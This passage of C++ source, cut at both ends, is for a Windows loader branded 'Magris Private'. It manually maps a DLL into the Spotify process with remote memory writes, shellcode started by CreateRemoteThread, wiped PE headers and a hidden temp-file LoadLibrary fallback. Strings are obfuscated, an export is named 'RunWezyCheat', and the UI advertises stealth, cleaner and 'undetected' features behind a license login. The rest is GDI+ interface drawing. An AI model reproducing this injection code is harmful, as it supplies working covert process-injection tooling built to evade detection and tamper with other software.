        SendErrorLog(XS("ManualMap: OpenProcess fail (PID=") + std::to_string(spotifyPid) + XS(" WinErr=") + std::to_string(e) + XS(")"));
        SetLastError(0xA1); return false;
    }

    SIZE_T imageSize = ntH->OptionalHeader.SizeOfImage;
    LPVOID pRemote = VirtualAllocEx(hProc, NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemote) {
        SendErrorLog(XS("ManualMap: VirtualAllocEx image fail (size=") + std::to_string(imageSize) + XS(" err=") + std::to_string(GetLastError()) + XS(")"));
        CloseHandle(hProc); SetLastError(0xA2); return false;
    }

    
    std::vector<BYTE> localImage(imageSize, 0);
    memcpy(localImage.data(), dllBytes.data(), ntH->OptionalHeader.SizeOfHeaders);
    IMAGE_SECTION_HEADER* secH = IMAGE_FIRST_SECTION(ntH);
    for (WORD i = 0; i < ntH->FileHeader.NumberOfSections; i++) {
        if (secH[i].SizeOfRawData > 0 && secH[i].PointerToRawData > 0) {
            SIZE_T copySize = ((SIZE_T)secH[i].SizeOfRawData < (SIZE_T)secH[i].Misc.VirtualSize) ? (SIZE_T)secH[i].SizeOfRawData : (SIZE_T)secH[i].Misc.VirtualSize;
            if (secH[i].PointerToRawData + copySize > dllBytes.size()) continue;
            if (secH[i].VirtualAddress + copySize > imageSize) continue;
            memcpy(localImage.data() + secH[i].VirtualAddress,
                   dllBytes.data() + secH[i].PointerToRawData, copySize);
        }
    }

    SendErrorLogFast(XS("ManualMap STEP1: Sections mapped, relocation basliyor (remoteBase=0x") + MMapErrStr((DWORD)(ULONGLONG)pRemote) + XS(")"));
    ApplyRelocations(localImage.data(), (ULONGLONG)pRemote);

    
    FARPROC fnRunWezy = FindExportInDll(localImage.data(), XS("RunWezyCheat").c_str());
    LPVOID fnRunWezyRemote = nullptr;
    if (fnRunWezy)
        fnRunWezyRemote = (LPVOID)((BYTE*)pRemote + ((BYTE*)fnRunWezy - localImage.data()));

    
    FARPROC fnDllMain = nullptr;
    if (ntH->OptionalHeader.AddressOfEntryPoint)
        fnDllMain = (FARPROC)((BYTE*)pRemote + ntH->OptionalHeader.AddressOfEntryPoint);

    SendErrorLogFast(XS("ManualMap STEP2: Image yaziliyor (DllMain=") + std::to_string(ntH->OptionalHeader.AddressOfEntryPoint != 0) + XS(" RunWezy=") + std::to_string(fnRunWezyRemote != nullptr) + XS(" imgSize=") + std::to_string(imageSize) + XS(")"));
    if (!WriteProcessMemory(hProc, pRemote, localImage.data(), imageSize, NULL)) {
        DWORD wpmErr = GetLastError();
        SendErrorLog(XS("ManualMap: WriteProcessMemory image fail (size=") + std::to_string(imageSize) + XS(" err=") + std::to_string(wpmErr) + XS(")"));
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        SetLastError(0xA6);
        return false;
    }

    
    IMAGE_NT_HEADERS* ntHLocal = (IMAGE_NT_HEADERS*)(localImage.data() + dosH->e_lfanew);
    IMAGE_SECTION_HEADER* secHL = IMAGE_FIRST_SECTION(ntHLocal);
    for (WORD si = 0; si < ntHLocal->FileHeader.NumberOfSections; si++) {
        DWORD protect = PAGE_READONLY;
        DWORD ch = secHL[si].Characteristics;
        bool exec  = (ch & IMAGE_SCN_MEM_EXECUTE) != 0;
        bool write = (ch & IMAGE_SCN_MEM_WRITE) != 0;
        if (exec && write)      protect = PAGE_EXECUTE_READWRITE;
        else if (exec)          protect = PAGE_EXECUTE_READ;
        else if (write)         protect = PAGE_READWRITE;
        DWORD oldProt = 0;
        VirtualProtectEx(hProc, (BYTE*)pRemote + secHL[si].VirtualAddress,
            secHL[si].Misc.VirtualSize, protect, &oldProt);
    }

    
    FlushInstructionCache(hProc, pRemote, imageSize);

    
    ManualMapData mapData = {};
    mapData.pBase           = pRemote;
    mapData.fnLoadLibraryA  = (HMODULE(WINAPI*)(LPCSTR))GetProcAddress(GetModuleHandleA(XS("kernel32.dll").c_str()), XS("LoadLibraryA").c_str());
    mapData.fnGetProcAddress= (FARPROC(WINAPI*)(HMODULE,LPCSTR))GetProcAddress(GetModuleHandleA(XS("kernel32.dll").c_str()), XS("GetProcAddress").c_str());
    mapData.fnDllMain       = (BOOL(WINAPI*)(HINSTANCE,DWORD,LPVOID))fnDllMain;
    mapData.fnRunWezyCheat  = fnRunWezyRemote;
    mapData.result          = 0;

    LPVOID pMapDataRemote = VirtualAllocEx(hProc, NULL, sizeof(ManualMapData), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pMapDataRemote) {
        SendErrorLog(XS("ManualMap: VirtualAllocEx mapdata fail"));
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE); CloseHandle(hProc); SetLastError(0xA3); return false;
    }
    if (!WriteProcessMemory(hProc, pMapDataRemote, &mapData, sizeof(mapData), NULL)) {
        SendErrorLog(XS("ManualMap: WriteProcessMemory mapdata fail (err=") + std::to_string(GetLastError()) + XS(")"));
        VirtualFreeEx(hProc, pMapDataRemote, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc); SetLastError(0xA7); return false;
    }

    
    SIZE_T shellcodeSize = (SIZE_T)((BYTE*)ShellcodeEntry_End - (BYTE*)ShellcodeEntry);
    if (shellcodeSize < 512 || shellcodeSize > 65536) shellcodeSize = 8192;
    shellcodeSize = (shellcodeSize + 4095) & ~4095;

    LPVOID pShellcode = VirtualAllocEx(hProc, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pShellcode) {
        SendErrorLog(XS("ManualMap: VirtualAllocEx shellcode fail (size=") + std::to_string(shellcodeSize) + XS(")"));
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, pMapDataRemote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        SetLastError(0xA4);
        return false;
    }
    if (!WriteProcessMemory(hProc, pShellcode, (LPVOID)ShellcodeEntry, shellcodeSize, NULL)) {
        SendErrorLog(XS("ManualMap: WriteProcessMemory shellcode fail (err=") + std::to_string(GetLastError()) + XS(")"));
        VirtualFreeEx(hProc, pShellcode, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, pMapDataRemote, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc); SetLastError(0xA8); return false;
    }
    FlushInstructionCache(hProc, pShellcode, shellcodeSize);

    SendErrorLogFast(XS("ManualMap STEP3: Shellcode yazildi (size=") + std::to_string(shellcodeSize) + XS("), CreateRemoteThread baslatiliyor..."));
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcode, pMapDataRemote, 0, NULL);
    if (!hThread) {
        DWORD crtErr = GetLastError();
        SendErrorLog(XS("ManualMap: CreateRemoteThread fail (err=") + std::to_string(crtErr) + XS(")"));
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, pMapDataRemote, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, pShellcode, 0, MEM_RELEASE);
        CloseHandle(hProc);
        SetLastError(0xA5);
        return false;
    }

    SendErrorLogFast(XS("ManualMap STEP4: RemoteThread olusturuldu, bekleniyor (25sn timeout)..."));

    DWORD waitResult = WaitForSingleObject(hThread, 25000);
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    CloseHandle(hThread);

    DWORD spotifyExitCode = 0;
    BOOL procAlive = GetExitCodeProcess(hProc, &spotifyExitCode);
    bool spotifyDead = (!procAlive || spotifyExitCode != STILL_ACTIVE);

    ManualMapData remoteResult = {};
    BOOL readOk = ReadProcessMemory(hProc, pMapDataRemote, &remoteResult, sizeof(remoteResult), NULL);

    bool ok = (waitResult == WAIT_OBJECT_0) && (remoteResult.result == 0xFF);

    SendErrorLogFast(XS("ManualMap STEP5: Wait=") + std::to_string(waitResult) +
        XS(" exitCode=0x") + MMapErrStr(exitCode) +
        XS(" result=0x") + MMapErrStr(remoteResult.result) +
        XS(" readOk=") + std::to_string((int)readOk) +
        XS(" spotifyDead=") + std::to_string((int)spotifyDead) +
        (spotifyDead ? (XS(" spotifyExit=0x") + MMapErrStr(spotifyExitCode)) : "") +
        XS(" ok=") + std::to_string((int)ok));

    if (!ok) {
        std::string detail = XS("ManualMap: Shellcode basarisiz - wait=");
        if (waitResult == WAIT_OBJECT_0) detail += XS("OK");
        else if (waitResult == WAIT_TIMEOUT) detail += XS("TIMEOUT");
        else detail += MMapErrStr(waitResult);
        detail += XS(" result=0x") + MMapErrStr(remoteResult.result);
        detail += XS(" exitCode=0x") + MMapErrStr(exitCode);
        if (remoteResult.result != 0 && remoteResult.result != 0xFF)
            detail += XS(" (") + MMapErrDetail(remoteResult.result) + XS(")");
        SendErrorLog(detail);
    } else {
        SendErrorLog(XS("ManualMap: Basarili! DLL inject edildi (PID=") + std::to_string(spotifyPid) + XS(")"));
    }

    
    BYTE zeros[4096] = {};
    SIZE_T headerSize = ((SIZE_T)ntH->OptionalHeader.SizeOfHeaders < sizeof(zeros)) ? (SIZE_T)ntH->OptionalHeader.SizeOfHeaders : sizeof(zeros);
    WriteProcessMemory(hProc, pRemote, zeros, headerSize, NULL);

    
    VirtualFreeEx(hProc, pShellcode, 0, MEM_RELEASE);
    VirtualFreeEx(hProc, pMapDataRemote, 0, MEM_RELEASE);

    if (ok) {
        g_mappedBaseInSpotify = pRemote;
        g_spotifyPidForCleanup = spotifyPid;
    } else {
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        SetLastError(remoteResult.result ? remoteResult.result : 0xDEAD);
    }

    CloseHandle(hProc);
    return ok;
}


static bool LoadLibraryInject(DWORD spotifyPid, const std::vector<BYTE>& dllBytes) {
    SendErrorLogFast(XS("Fallback BASLADI (PID=") + std::to_string(spotifyPid) + XS(")"));
    wchar_t tempDir[MAX_PATH] = {};
    GetTempPathW(MAX_PATH, tempDir);
    std::wstring tempDll = std::wstring(tempDir) + XW(L"~svc_") + std::to_wstring(GetTickCount64()) + XW(L".tmp");

    HANDLE hFile = CreateFileW(tempDll.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        SendErrorLog(XS("Fallback: Temp dosya olusturulamadi (err=") + std::to_string(GetLastError()) + XS(")"));
        SetLastError(0xB1); return false;
    }
    DWORD written = 0;
    WriteFile(hFile, dllBytes.data(), (DWORD)dllBytes.size(), &written, NULL);
    CloseHandle(hFile);
    if (written != (DWORD)dllBytes.size()) {
        SendErrorLog(XS("Fallback: Temp dosya yazma hatasi (yazilan=") + std::to_string(written) + XS(" beklenen=") + std::to_string(dllBytes.size()) + XS(")"));
        DeleteFileW(tempDll.c_str()); SetLastError(0xB2); return false;
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, spotifyPid);
    if (!hProc) {
        SendErrorLog(XS("Fallback: OpenProcess fail (PID=") + std::to_string(spotifyPid) + XS(" err=") + std::to_string(GetLastError()) + XS(")"));
        DeleteFileW(tempDll.c_str()); SetLastError(0xB3); return false;
    }

    
    SIZE_T pathSize = (tempDll.size() + 1) * sizeof(wchar_t);
    LPVOID pRemotePath = VirtualAllocEx(hProc, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemotePath) {
        SendErrorLog(XS("Fallback: VirtualAllocEx path fail (err=") + std::to_string(GetLastError()) + XS(")"));
        CloseHandle(hProc); DeleteFileW(tempDll.c_str()); SetLastError(0xB4); return false;
    }
    WriteProcessMemory(hProc, pRemotePath, tempDll.c_str(), pathSize, NULL);

    
    FARPROC fnLoadLib = GetProcAddress(GetModuleHandleA(XS("kernel32.dll").c_str()), XS("LoadLibraryW").c_str());
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)fnLoadLib, pRemotePath, 0, NULL);
    if (!hThread) {
        SendErrorLog(XS("Fallback: CreateRemoteThread fail (err=") + std::to_string(GetLastError()) + XS(")"));
        VirtualFreeEx(hProc, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProc);
        DeleteFileW(tempDll.c_str());
        SetLastError(0xB5);
        return false;
    }

    SendErrorLogFast(XS("Fallback STEP1: LoadLibraryW thread baslatildi, bekleniyor..."));
    WaitForSingleObject(hThread, 15000);
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    CloseHandle(hThread);
    VirtualFreeEx(hProc, pRemotePath, 0, MEM_RELEASE);

    DWORD spExitFb = 0;
    GetExitCodeProcess(hProc, &spExitFb);
    bool spDeadFb = (spExitFb != STILL_ACTIVE);
    SendErrorLogFast(XS("Fallback STEP2: exitCode=0x") + MMapErrStr(exitCode) + XS(" spotifyDead=") + std::to_string((int)spDeadFb) + (spDeadFb ? XS(" spotifyExit=0x") + MMapErrStr(spExitFb) : ""));

    
    Sleep(500);
    DeleteFileW(tempDll.c_str());

    
    
    
    FARPROC fnGetProc = GetProcAddress(GetModuleHandleA(XS("kernel32.dll").c_str()), XS("GetProcAddress").c_str());
    FARPROC fnGetMod  = GetProcAddress(GetModuleHandleA(XS("kernel32.dll").c_str()), XS("GetModuleHandleA").c_str());

    
    
    

    
    
    
    

    
    

    CloseHandle(hProc);

    
    if (exitCode == 0) {
        SendErrorLog(XS("Fallback: LoadLibraryW handle=0, DLL yuklenemedi (PID=") + std::to_string(spotifyPid) + XS(")"));
        SetLastError(0xB6); return false;
    }

    SendErrorLog(XS("Fallback: Basarili! DLL LoadLibrary ile inject edildi (PID=") + std::to_string(spotifyPid) + XS(")"));
    g_spotifyPidForCleanup = spotifyPid;
    return true;
}




static void MakeRoundRect(GraphicsPath& path, float x, float y, float w, float h, float r) {
    path.Reset();
    path.AddArc(x,         y,         r*2, r*2, 180.0f, 90.0f);
    path.AddArc(x+w-r*2,   y,         r*2, r*2, 270.0f, 90.0f);
    path.AddArc(x+w-r*2,   y+h-r*2,   r*2, r*2,   0.0f, 90.0f);
    path.AddArc(x,         y+h-r*2,   r*2, r*2,  90.0f, 90.0f);
    path.CloseFigure();
}




void ShowLoginCtrls(bool show) {
    int sw = show ? SW_SHOW : SW_HIDE;
    if (g_hUser) ShowWindow(g_hUser, sw); if (g_hPass) ShowWindow(g_hPass, sw);
    if (g_hBtnL) ShowWindow(g_hBtnL, sw);
}

void ShowMainCtrls(bool show) {
    int sw = show ? SW_SHOW : SW_HIDE;
    if (g_hBtnLoad) ShowWindow(g_hBtnLoad, sw);
    if (g_hChkLua) ShowWindow(g_hChkLua, sw); if (g_hChkSt) ShowWindow(g_hChkSt, sw); if (g_hChkCl) ShowWindow(g_hChkCl, sw);
    for (int i = 0; i < PROD_COUNT; i++) if (g_hProd[i]) ShowWindow(g_hProd[i], sw);
}




void DrawLogo(Graphics& g, float x, float y, float size, float penW = 1.5f) {
    Pen pen(CLR_ACCENT, penW);
    float r = size * 0.18f;
    GraphicsPath outer;
    MakeRoundRect(outer, x, y, size, size, r);
    g.DrawPath(&pen, &outer);
    Pen pen2(CLR_ACCENT, penW * 0.7f);
    float pad = size * 0.22f;
    g.DrawRectangle(&pen2, x+pad, y+pad, size-pad*2, size-pad*2);
    float cx = x + size/2, cy = y + size/2, m = size * 0.1f;
    g.DrawLine(&pen, cx, y+m, cx, y+size-m);
    g.DrawLine(&pen, x+m, cy, x+size-m, cy);
}




void DrawTunnel(Graphics& g, int ox, int oy, int pw, int ph, int tick) {
    SolidBrush bgBr(Color(255, 10, 10, 16));
    g.FillRectangle(&bgBr, ox, oy, pw, ph);
    Pen gridPen(Color(14, 130, 60, 200), 1.0f);
    for (int i = 1; i < 7; i++) {
        g.DrawLine(&gridPen, ox + pw*i/7, oy, ox + pw*i/7, oy+ph);
        g.DrawLine(&gridPen, ox, oy + ph*i/7, ox+pw, oy + ph*i/7);
    }
    float cx = ox + pw / 2.0f, cy = oy + ph / 2.0f;
    for (int i = 0; i < 9; i++) {
        float t = (float)i / 9.0f;
        float pulse = 1.0f + 0.04f * sinf((tick * 0.07f) + i * 0.65f);
        float sz = (20.0f + i * 24.0f) * pulse;
        float alpha = (0.08f + t * 0.50f) * 255.0f;
        float gAlpha = (0.04f + t * 0.20f) * 255.0f;
        float rad = 3.0f + i * 2.2f;
        Pen gp(Color((BYTE)gAlpha, 160, 80, 255), 3.0f);
        GraphicsPath gpath;
        MakeRoundRect(gpath, cx-sz-2, cy-sz-2, (sz+2)*2, (sz+2)*2, rad+1);
        g.DrawPath(&gp, &gpath);
        Pen rp(Color((BYTE)alpha, 160, 80, 255), 1.4f);
        GraphicsPath rpath;
        MakeRoundRect(rpath, cx-sz, cy-sz, sz*2, sz*2, rad);
        g.DrawPath(&rp, &rpath);
    }
    float ps = 1.0f + 0.18f * sinf(tick * 0.11f);
    float gs = 14.0f * ps;
    GraphicsPath cp;
    cp.AddEllipse(cx-gs, cy-gs, gs*2, gs*2);
    PathGradientBrush pgb(&cp);
    Color cc[] = { Color(255,220,170,255), Color(0,160,80,255) };
    REAL pp[] = { 0.0f, 1.0f };
    pgb.SetInterpolationColors(cc, pp, 2);
    g.FillPath(&pgb, &cp);
}




void DrawProductThumb(Graphics& g, int x, int y, int w, int h, const Product& p, bool selected, int productIndex) {
    GraphicsPath thumbPath;
    MakeRoundRect(thumbPath, (float)x, (float)y, (float)w, (float)h, 5.0f);
    bool hasCardBg = (productIndex >= 0 && productIndex < 2 && g_bmpCardBg[productIndex] && g_bmpCardBg[productIndex]->GetWidth() > 0);
    if (!hasCardBg) {
        LinearGradientBrush lgb(RectF((float)x, (float)y, (float)w, (float)h),
            Color(255, GetRValue(p.thumbColor1), GetGValue(p.thumbColor1), GetBValue(p.thumbColor1)),
            Color(255, GetRValue(p.thumbColor2), GetGValue(p.thumbColor2), GetBValue(p.thumbColor2)),
            LinearGradientModeForwardDiagonal);
        g.FillPath(&lgb, &thumbPath);
    }
    Pen borderPen(selected ? CLR_SEL_BORDER : CLR_SEP, 1.5f);
    g.DrawPath(&borderPen, &thumbPath);
    SolidBrush badgeBg(Color(160, 0, 0, 0));
    GraphicsPath badgePath;
    MakeRoundRect(badgePath, (float)(x + w - 38), (float)(y + 6), 34.0f, 16.0f, 3.5f);
    g.FillPath(&badgeBg, &badgePath);
    FontFamily ff(XWC(L"Segoe UI"));
    Font fBadge(&ff, 9, FontStyleBold, UnitPixel);
    SolidBrush greenBr(CLR_GREEN);
    g.DrawString(XWC(L"UD"), -1, &fBadge, PointF((float)(x+w-30), (float)(y+8)), &greenBr);
    if (selected) { SolidBrush dotBr(CLR_ACCENT); g.FillEllipse(&dotBr, (REAL)(x+6), (REAL)(y+6), 9.0f, 9.0f); }
}




void Paint(HDC hdc) {
    static HDC s_memDC = NULL;
    static HBITMAP s_memBmp = NULL;
    static HBITMAP s_oldBmp = NULL;
    static FontFamily* s_ff = nullptr;
    static SolidBrush* s_whiteBr = nullptr;
    static SolidBrush* s_mutedBr = nullptr;
    static SolidBrush* s_accentBr = nullptr;
    static SolidBrush* s_dimBr = nullptr;
    static Pen* s_sepPen = nullptr;
    static LinearGradientBrush* s_bgBr = nullptr;

    if (!s_memDC) {
        s_memDC = CreateCompatibleDC(hdc);
        s_memBmp = CreateCompatibleBitmap(hdc, WIN_W, WIN_H);
        s_oldBmp = (HBITMAP)SelectObject(s_memDC, s_memBmp);
        s_ff = new FontFamily(XWC(L"Segoe UI"));
        s_whiteBr = new SolidBrush(CLR_WHITE);
        s_mutedBr = new SolidBrush(CLR_MUTED);
        s_accentBr = new SolidBrush(CLR_ACCENT);
        s_dimBr = new SolidBrush(CLR_DIM);
        s_sepPen = new Pen(CLR_SEP, 1.0f);
        s_bgBr = new LinearGradientBrush(RectF(0, 0, (float)WIN_W, (float)WIN_H), CLR_BG, CLR_BG2, LinearGradientModeVertical);
    }
    FontFamily& ff = *s_ff;
    SolidBrush& whiteBr = *s_whiteBr;
    SolidBrush& mutedBr = *s_mutedBr;
    SolidBrush& accentBr = *s_accentBr;
    SolidBrush& dimBr = *s_dimBr;
    Pen& sepPen = *s_sepPen;

    Graphics g(s_memDC);
    g.SetSmoothingMode(SmoothingModeAntiAlias);
    g.SetTextRenderingHint(TextRenderingHintClearTypeGridFit);

    g.FillRectangle(s_bgBr, 0, 0, WIN_W, WIN_H);

    
    SolidBrush tbBr(CLR_TITLEBAR);
    g.FillRectangle(&tbBr, 0, 0, WIN_W, TITLEH);
    g.DrawLine(&sepPen, 0.0f, (REAL)TITLEH, (REAL)WIN_W, (REAL)TITLEH);
    const int titleLogoSize = 36;
    if (g_bmpLogoSmall)
        g.DrawImage(g_bmpLogoSmall, 6, 2, titleLogoSize, titleLogoSize);
    else if (g_bmpLogo)
        g.DrawImage(g_bmpLogo, 6, 2, titleLogoSize, titleLogoSize);
    else
        DrawLogo(g, 6.0f, 2.0f, (float)titleLogoSize, 2.0f);
    Font fName(&ff, 15, FontStyleBold, UnitPixel);
    Font fSub(&ff, 11, FontStyleRegular, UnitPixel);
    g.DrawString(XWC(L"Magris"), -1, &fName, PointF((float)(6 + titleLogoSize + 6), 4.0f), &accentBr);
    g.DrawString(XWC(L"Private"), -1, &fSub, PointF((float)(6 + titleLogoSize + 6), 22.0f), &mutedBr);
    Font fDate(&ff, 9, FontStyleRegular, UnitPixel);
    StringFormat sfR; sfR.SetAlignment(StringAlignmentFar);
    
    SYSTEMTIME st;
    GetLocalTime(&st);
    wchar_t dateBuf[64];
    swprintf_s(dateBuf, XWC(L"%02d.%02d.%04d"), st.wDay, st.wMonth, st.wYear);
    
    g.DrawString(dateBuf, -1, &fDate, RectF(0, 12.0f, (float)(WIN_W - 44), 14.0f), &sfR, &dimBr);
    SolidBrush xBg(Color(255,30,30,40));
    GraphicsPath xPath;
    MakeRoundRect(xPath, (float)(WIN_W-34), 8.0f, 24.0f, 24.0f, 4.0f);
    g.FillPath(&xBg, &xPath);
    Font fX(&ff, 10, FontStyleRegular, UnitPixel);
    StringFormat sfC; sfC.SetAlignment(StringAlignmentCenter); sfC.SetLineAlignment(StringAlignmentCenter);
    g.DrawString(XWC(L"\u2715"), -1, &fX, RectF((float)(WIN_W-34), 8.0f, 24.0f, 24.0f), &sfC, &mutedBr);

    int bodyY = TITLEH;

    if (!g_loggedIn) {
        SolidBrush blackBr(Color(255, 0, 0, 0));
        g.FillRectangle(&blackBr, 0, bodyY, WIN_W, WIN_H - bodyY);
        
        const int loginLogoSize = 64;
        int cx = WIN_W / 2;
        if (g_bmpLogoSmall)
            g.DrawImage(g_bmpLogoSmall, cx - loginLogoSize/2, bodyY + 20, loginLogoSize, loginLogoSize);
        else if (g_bmpLogo)
            g.DrawImage(g_bmpLogo, cx - loginLogoSize/2, bodyY + 20, loginLogoSize, loginLogoSize);
        else
            DrawLogo(g, (float)(cx - loginLogoSize/2), (float)(bodyY + 20), (float)loginLogoSize, 2.0f);
        
        Font fTitle(&ff, 18, FontStyleBold, UnitPixel);
        StringFormat sfC2; sfC2.SetAlignment(StringAlignmentCenter);
        g.DrawString(XWC(L"Magris Private"), -1, &fTitle, RectF(0, (float)(bodyY+90), (float)WIN_W, 22.0f), &sfC2, &whiteBr);
        
        int formW = 320;
        int formX = (WIN_W - formW) / 2;
        
        SolidBrush editBg(CLR_EDIT_BG);
        Pen editBorder(CLR_SEP, 1.0f);
        
        g.FillRectangle(&editBg, formX, bodyY+144, formW, 32);
        g.DrawRectangle(&editBorder, (REAL)formX, (REAL)(bodyY+144), (REAL)formW, 32.0f);
        
        g.FillRectangle(&editBg, formX, bodyY+200, formW, 32);
        g.DrawRectangle(&editBorder, (REAL)formX, (REAL)(bodyY+200), (REAL)formW, 32.0f);
        
        Font fLbl(&ff, 10, FontStyleRegular, UnitPixel);
        g.DrawString(XWC(L"KULLANICI ADI"), -1, &fLbl, PointF((float)formX, (float)(bodyY+130)), &mutedBr);
        g.DrawString(XWC(L"ÅžÄ°FRE / LÄ°SANS"), -1, &fLbl, PointF((float)formX, (float)(bodyY+186)), &mutedBr);
    } else {
        SolidBrush lpBr(CLR_PANEL_L);
        g.FillRectangle(&lpBr, 0, bodyY, MPANEL, WIN_H - bodyY);
        g.DrawLine(&sepPen, (REAL)MPANEL, (REAL)bodyY, (REAL)MPANEL, (REAL)WIN_H);
        SolidBrush rpBr(CLR_PANEL_R);
        g.FillRectangle(&rpBr, MPANEL, bodyY, WIN_W-MPANEL, WIN_H - bodyY - FOOTHER);
        SolidBrush ftBr(CLR_BG);
        g.FillRectangle(&ftBr, 0, WIN_H-FOOTHER, WIN_W, FOOTHER);
        g.DrawLine(&sepPen, 0.0f, (REAL)(WIN_H-FOOTHER), (REAL)WIN_W, (REAL)(WIN_H-FOOTHER));

        const int cardH = 78;
        int cardY = bodyY + 8;
        const wchar_t* catNames[] = { XWC(L"Magris Private"), XWC(L"Magris Safe Destruct") };
        int catStart[] = { 0, 1 }, catCount[] = { 1, 1 };
        for (int c = 0; c < 2; c++) {
            Font fCat(&ff, 11, FontStyleBold, UnitPixel);
            g.DrawString(catNames[c], -1, &fCat, PointF(10.0f, (float)cardY), &whiteBr);
            cardY += 18;
            for (int i = catStart[c]; i < catStart[c] + catCount[c]; i++) {
                bool sel = (g_selProd == i);
                SolidBrush cardBg(sel ? CLR_SELECTED : CLR_BTN_NORM);
                GraphicsPath cardPath;
                MakeRoundRect(cardPath, 8.0f, (float)cardY, (float)(MPANEL-16), (float)cardH, 6.0f);
                if (i < 2 && g_bmpCardBg[i] && g_bmpCardBg[i]->GetWidth() > 0) {
                    g.SetClip(&cardPath);
                    g.SetInterpolationMode(InterpolationModeBilinear);
                    g.DrawImage(g_bmpCardBg[i], 8, cardY, MPANEL-16, cardH);
                    g.ResetClip();
                } else {
                    g.FillPath(&cardBg, &cardPath);
                }
                if (sel) { Pen selPen(CLR_SEL_BORDER, 1.5f); g.DrawPath(&selPen, &cardPath); }
                Font fPn(&ff, 13, FontStyleBold, UnitPixel);
                Font fPt(&ff, 10, FontStyleRegular, UnitPixel);
                const wchar_t* cardTitle = (i == 0) ? XWC(L"Magris Private") : XWC(L"Magris Safe Destruct");
                g.DrawString(cardTitle, -1, &fPn, PointF(12.0f, (float)(cardY+10)), &whiteBr);
                g.DrawString(g_products[i].tag, -1, &fPt, PointF(12.0f, (float)(cardY+28)), &mutedBr);
                Font fUs(&ff, 10, FontStyleRegular, UnitPixel);
                g.DrawString(i==0 ? XWC(L"â™¦ 12.679") : XWC(L"â™¦ 7.289"), -1, &fUs, PointF(12.0f, (float)(cardY+46)), &dimBr);
                cardY += cardH + 6;
            }
            cardY += 6;
        }

        const Product& prod = g_products[g_selProd];
        int rx = MPANEL + 12, rw = WIN_W - MPANEL - 12, ry = bodyY + 10;
        Font fDName(&ff, 15, FontStyleBold, UnitPixel);
        g.DrawString(prod.name, -1, &fDName, PointF((float)rx, (float)ry), &whiteBr);
        ry += 28;
        g.DrawLine(&sepPen, (REAL)rx, (float)ry, (REAL)(WIN_W-12), (float)ry);
        ry += 12;
        Font fLbl2(&ff, 10, FontStyleRegular, UnitPixel);
        Font fVal2(&ff, 11, FontStyleBold, UnitPixel);
        SolidBrush greenBr(CLR_GREEN);
        g.DrawString(XWC(L"Expiry"), -1, &fLbl2, PointF((float)rx, (float)ry), &mutedBr);
        StringFormat sfR2; sfR2.SetAlignment(StringAlignmentFar);
        g.DrawString(g_userExpiry.c_str(), -1, &fVal2, RectF((float)rx, (float)ry, (float)(WIN_W-rx-12), 14.0f), &sfR2, &whiteBr);
        ry += 20;
        Pen rowSep(CLR_ROW_SEP, 1.0f);
        g.DrawLine(&rowSep, (REAL)rx, (float)(ry-2), (REAL)(WIN_W-12), (float)(ry-2));
        g.DrawString(XWC(L"Status"), -1, &fLbl2, PointF((float)rx, (float)ry), &mutedBr);
        g.DrawString(prod.status, -1, &fVal2, RectF((float)rx, (float)ry, (float)(WIN_W-rx-12), 14.0f), &sfR2, &greenBr);
        ry += 20;
        g.DrawLine(&rowSep, (REAL)rx, (float)(ry-2), (REAL)(WIN_W-12), (float)(ry-2));
        g.DrawString(XWC(L"Last Updated"), -1, &fLbl2, PointF((float)rx, (float)ry), &mutedBr);
        g.DrawString(prod.updated, -1, &fVal2, RectF((float)rx, (float)ry, (float)(WIN_W-rx-12), 14.0f), &sfR2, &whiteBr);
        ry += 26;

        const int ckSize = 20, ckRight = 36;
        bool chkVals[] = { g_chkLua, g_chkStealth, g_chkCleaner };
        const wchar_t* chkLbls[] = { XWC(L"Magris Private Menu:"), XWC(L"Stealth (Streamproof):"), XWC(L"Cleaner:"), };
        Font fChkLbl(&ff, 11, FontStyleRegular, UnitPixel);
        for (int i = 0; i < 3; i++) {
            g.DrawString(chkLbls[i], -1, &fChkLbl, PointF((float)rx, (float)ry), &whiteBr);
            Pen ckPen(chkVals[i] ? CLR_SEL_BORDER : CLR_SEP, 1.4f);
            GraphicsPath ckPath;
            MakeRoundRect(ckPath, (float)(WIN_W - ckRight - ckSize), (float)ry, (float)ckSize, (float)ckSize, 4.0f);
            if (chkVals[i]) { SolidBrush ckFill(CLR_ACCENT2); g.FillPath(&ckFill, &ckPath); }
            g.DrawPath(&ckPen, &ckPath);
            if (chkVals[i]) { Font fChk2(&ff, 12, FontStyleBold, UnitPixel); g.DrawString(XWC(L"\u2713"), -1, &fChk2, PointF((float)(WIN_W - ckRight - ckSize + 3), (float)(ry - 1)), &whiteBr); }
            ry += 28;
        }
    }

    BitBlt(hdc, 0, 0, WIN_W, WIN_H, s_memDC, 0, 0, SRCCOPY);
}




void DrawLoginBtn(LPDRAWITEMSTRUCT di) {
